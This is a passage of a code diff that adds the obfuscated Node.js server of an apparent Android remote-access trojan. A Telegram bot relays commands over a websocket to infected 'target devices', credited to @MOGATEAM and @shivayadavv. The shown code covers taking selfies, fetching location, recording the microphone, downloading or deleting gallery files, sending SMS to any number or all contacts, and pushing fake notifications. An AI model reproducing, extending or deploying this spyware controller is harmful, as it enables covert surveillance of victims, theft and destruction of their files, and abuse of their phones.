+      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+      {
+        parse_mode: 'HTML',
+        reply_markup: {
+          keyboard: [
+            [
+              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+            ],
+            [
+              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+            ],
+          ],
+          resize_keyboard: true,
+        },
+      }
+    ))
+  _0x2f3f8b == 'camera_selfie' &&
+    (appSocket.clients.forEach(function _0x152118(_0x6dad04) {
+      _0x6dad04.uuid == _0x39894d && _0x6dad04.send('camera_selfie')
+    }),
+    appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+      {
+        parse_mode: 'HTML',
+        reply_markup: {
+          keyboard: [
+            [
+              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+            ],
+            [
+              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+            ],
+          ],
+          resize_keyboard: true,
+        },
+      }
+    ))
+  _0x2f3f8b == 'location' &&
+    (appSocket.clients.forEach(function _0x43033a(_0x4cd64d) {
+      _0x4cd64d.uuid == _0x39894d && _0x4cd64d.send('location')
+    }),
+    appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+      {
+        parse_mode: 'HTML',
+        reply_markup: {
+          keyboard: [
+            [
+              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+            ],
+            [
+              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+            ],
+          ],
+          resize_keyboard: true,
+        },
+      }
+    ))
+  _0x2f3f8b == 'vibrate' &&
+    (appSocket.clients.forEach(function _0x590c81(_0x275379) {
+      _0x275379.uuid == _0x39894d && _0x275379.send('vibrate')
+    }),
+    appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+      {
+        parse_mode: 'HTML',
+        reply_markup: {
+          keyboard: [
+            [
+              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+            ],
+            [
+              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+            ],
+          ],
+          resize_keyboard: true,
+        },
+      }
+    ))
+  _0x2f3f8b == 'stop_audio' &&
+    (appSocket.clients.forEach(function _0x12edbf(_0xac5b8c) {
+      _0xac5b8c.uuid == _0x39894d && _0xac5b8c.send('stop_audio')
+    }),
+    appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+      {
+        parse_mode: 'HTML',
+        reply_markup: {
+          keyboard: [
+            [
+              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+            ],
+            [
+              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+            ],
+          ],
+          resize_keyboard: true,
+        },
+      }
+    ))
+  _0x2f3f8b == 'send_message' &&
+    (appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE64 \uD835\uDE6C\uD835\uDE5D\uD835\uDE5E\uD835\uDE58\uD835\uDE5D \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE4E\uD835\uDE48\uD835\uDE4E\n\n\u2022ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
+      { reply_markup: { force_reply: true } }
+    ),
+    (currentUuid = _0x39894d))
+  _0x2f3f8b == 'send_message_to_all' &&
+    (appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68\n\n\u2022 ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
+      { reply_markup: { force_reply: true } }
+    ),
+    (currentUuid = _0x39894d))
+  _0x2f3f8b == 'file' &&
+    (appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59\n\n\u2022 ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
+      {
+        reply_markup: { force_reply: true },
+        parse_mode: 'HTML',
+      }
+    ),
+    (currentUuid = _0x39894d))
+  _0x2f3f8b == 'delete_file' &&
+    (appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A\n\n\u2022 ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
+      {
+        reply_markup: { force_reply: true },
+        parse_mode: 'HTML',
+      }
+    ),
+    (currentUuid = _0x39894d))
+  _0x2f3f8b == 'microphone' &&
+    (appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59\n\n\u2022 ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
+      {
+        reply_markup: { force_reply: true },
+        parse_mode: 'HTML',
+      }
+    ),
+    (currentUuid = _0x39894d))
+  _0x2f3f8b == 'toast' &&
+    (appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE64\uD835\uDE63 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\n\n\u2022 ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
+      {
+        reply_markup: { force_reply: true },
+        parse_mode: 'HTML',
+      }
+    ),
+    (currentUuid = _0x39894d))
+  _0x2f3f8b == 'show_notification' &&
+    (appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE56\uD835\uDE68 \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\n\n\u2022 ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
+      {
+        reply_markup: { force_reply: true },
+        parse_mode: 'HTML',
+      }
+    ),
+    (currentUuid = _0x39894d))
+  _0x2f3f8b == 'play_audio' &&
+    (appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64 \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE65\uD835\uDE61\uD835\uDE56\uD835\uDE6E\n\n\u2022 ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
+      {
+        reply_markup: { force_reply: true },
+        parse_mode: 'HTML',
+      }
+    ),
+    (currentUuid = _0x39894d))
+})
+setInterval(function () {
+  appSocket.clients.forEach(function _0x3b936c(_0x41c8f7) {
+    _0x41c8f7.send('ping')
+  })
+  try {
+    axios.get(address).then((_0x48f637) => '')
+  } catch (_0x1c37e3) {}
+}, 5000)
+appServer.listen(process.env.PORT || 8999)
